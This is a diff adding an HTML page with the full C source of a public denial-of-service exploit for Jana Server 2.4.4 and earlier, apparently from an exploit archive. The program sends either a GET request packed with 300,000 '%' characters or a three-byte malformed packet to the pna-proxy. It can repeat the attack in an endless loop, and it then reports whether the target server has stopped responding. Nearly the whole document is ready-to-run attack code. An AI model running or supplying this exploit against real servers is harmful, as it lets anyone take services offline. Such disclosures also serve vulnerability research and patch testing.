@@ -1,0 +1,266 @@
+<html>
+<head>
+<title>Jana Server <= 2.4.4 http/pna DoS</title>
+<pre>
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#ifdef WIN32
+    #include &lt;winsock.h&gt;
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = &quot;Interrupted system call&quot;; break;
+        case 10009: error = &quot;Bad file number&quot;; break;
+        case 10013: error = &quot;Permission denied&quot;; break;
+        case 10014: error = &quot;Bad address&quot;; break;
+        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
+        case 10024: error = &quot;Too many open files&quot;; break;
+        case 10035: error = &quot;Operation would block&quot;; break;
+        case 10036: error = &quot;Operation now in progress&quot;; break;
+        case 10037: error = &quot;Operation already in progress&quot;; break;
+        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
+        case 10039: error = &quot;Destination address required&quot;; break;
+        case 10040: error = &quot;Message too long&quot;; break;
+        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
+        case 10042: error = &quot;Bad protocol option&quot;; break;
+        case 10043: error = &quot;Protocol not supported&quot;; break;
+        case 10044: error = &quot;Socket type not supported&quot;; break;
+        case 10045: error = &quot;Operation not supported on socket&quot;; break;
+        case 10046: error = &quot;Protocol family not supported&quot;; break;
+        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
+        case 10048: error = &quot;Address already in use&quot;; break;
+        case 10049: error = &quot;Can't assign requested address&quot;; break;
+        case 10050: error = &quot;Network is down&quot;; break;
+        case 10051: error = &quot;Network is unreachable&quot;; break;
+        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
+        case 10053: error = &quot;Software caused connection abort&quot;; break;
+        case 10054: error = &quot;Connection reset by peer&quot;; break;
+        case 10055: error = &quot;No buffer space available&quot;; break;
+        case 10056: error = &quot;Socket is already connected&quot;; break;
+        case 10057: error = &quot;Socket is not connected&quot;; break;
+        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
+        case 10059: error = &quot;Too many references, can't splice&quot;; break;
+        case 10060: error = &quot;Connection timed out&quot;; break;
+        case 10061: error = &quot;Connection refused&quot;; break;
+        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
+        case 10063: error = &quot;File name too long&quot;; break;
+        case 10064: error = &quot;Host is down&quot;; break;
+        case 10065: error = &quot;No Route to Host&quot;; break;
+        case 10066: error = &quot;Directory not empty&quot;; break;
+        case 10067: error = &quot;Too many processes&quot;; break;
+        case 10068: error = &quot;Too many users&quot;; break;
+        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
+        case 10070: error = &quot;Stale NFS file handle&quot;; break;
+        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
+        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
+        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
+        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
+        case 11001: error = &quot;Host not found&quot;; break;
+        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
+        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
+        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
+    exit(1);
+}
+
+
+
+
+    #define close   closesocket
+#else
+    #include &lt;unistd.h&gt;
+    #include &lt;sys/socket.h&gt;
+    #include &lt;sys/types.h&gt;
+    #include &lt;arpa/inet.h&gt;
+    #include &lt;netinet/in.h&gt;
+    #include &lt;netdb.h&gt;
+#endif
+
+
+
+#define VER     &quot;0.1&quot;
+#define CHR     '%'
+#define GET1    &quot;GET /&quot;
+#define GET2    &quot; HTTP/1.0\r\n&quot; \
+                &quot;\r\n&quot;
+#define BOOMSZ  300000
+#define PNACPU  3
+#define TIMEOUT 3
+
+
+
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    int     sd,
+            len,
+            attack,
+            loop = 0;
+    u_short port;
+    u_char  *buff;
+
+
+    setbuf(stdout, NULL);
+
+    fputs(&quot;\n&quot;
+        &quot;Jana Server &lt;= 2.4.4 http/pna DoS &quot;VER&quot;\n&quot;
+        &quot;by Luigi Auriemma\n&quot;
+        &quot;e-mail: aluigi@altervista.org\n&quot;
+        &quot;web:    http://aluigi.altervista.org\n&quot;
+        &quot;\n&quot;, stdout);
+
+    if(argc &lt; 4) {
+        printf(&quot;\n&quot;
+            &quot;Usage: %s &lt;attack&gt; &lt;server&gt; &lt;port&gt; [loop]\n&quot;
+            &quot;\n&quot;
+            &quot;Attack:\n&quot;
+            &quot; 1 = http-server (temporary) CPU at 100%%, port 2506\n&quot;
+            &quot; 2 = full server freeze caused by loop in pna-proxy, port 1090\n&quot;
+            &quot;\n&quot;
+            &quot;Example check:   janados 1 localhost 2506\n&quot;
+            &quot;Example loop:    janados 1 localhost 2506 loop\n&quot;
+            &quot;\n&quot;, argv[0]);
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
+#endif
+
+    attack = atoi(argv[1]);
+    if(attack == 1) {
+        printf(
+            &quot;- http-server attack\n&quot;
+            &quot;- build HTTP request containing %d chars '%c'\n&quot;,
+            BOOMSZ, CHR);
+        len = sizeof(GET1) - 1 + BOOMSZ + sizeof(GET2);
+        buff = malloc(len);
+        if(!buff) std_err();
+        memcpy(buff, GET1, sizeof(GET1) - 1);
+        memset(buff + sizeof(GET1) - 1, CHR, BOOMSZ);
+        memcpy(buff + sizeof(GET1) - 1 + BOOMSZ, GET2, sizeof(GET2));
+
+    } else if(attack == 2) {
+        fputs(&quot;- pna-proxy attack\n&quot;, stdout);
+        buff = malloc(PNACPU);
+        if(!buff) std_err();
+        memset(buff, '\x7f', PNACPU);   // 0x7f7f, integer value
+        len = PNACPU;
+
+    } else {
+        fputs(&quot;\nError: wrong type of attack chosen\n\n&quot;, stdout);
+        exit(1);
+    }
+
+    port = atoi(argv[3]);
+
+    peer.sin_addr.s_addr = resolv(argv[2]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    if(argc &gt; 4) {
+        loop = 1;
+        fputs(&quot;- mega loop activated\n&quot;, stdout);
+    }
+
+    for(;;) {
+        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if(sd &lt; 0) std_err();
+
+        printf(&quot;- connect to %s:%hu ... &quot;,
+            inet_ntoa(peer.sin_addr), port);
+        if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
+          &lt; 0) std_err();
+        fputs(&quot;ok\n&quot;, stdout);
+
+        fputs(&quot;- send malformed request\n&quot;, stdout);
+        if(send(sd, buff, len, 0)
+          &lt; 0) std_err();
+
+        if(!loop) break;
+        close(sd);
+    }
+
+    fputs(&quot;- check server:\n&quot;, stdout);
+    if(timeout(sd) &lt; 0) {
+        fputs(&quot;\nServer IS vulnerable!!!\n\n&quot;, stdout);
+    } else {
+        fputs(&quot;\nServer doesn't seem vulnerable\n\n&quot;, stdout);
+    }
+
+    return(0);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&amp;fd_read);
+    FD_SET(sock, &amp;fd_read);
+    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
+    if(err &lt; 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct  hostent *hp;
+    u_long  host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;, host);
+            exit(1);
+        } else host_ip = *(u_long *)(hp-&gt;h_addr);
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror(&quot;\nError&quot;);
+        exit(1);
+    }
+#endif</pre>
+//milw0rm.com
+</html>
+
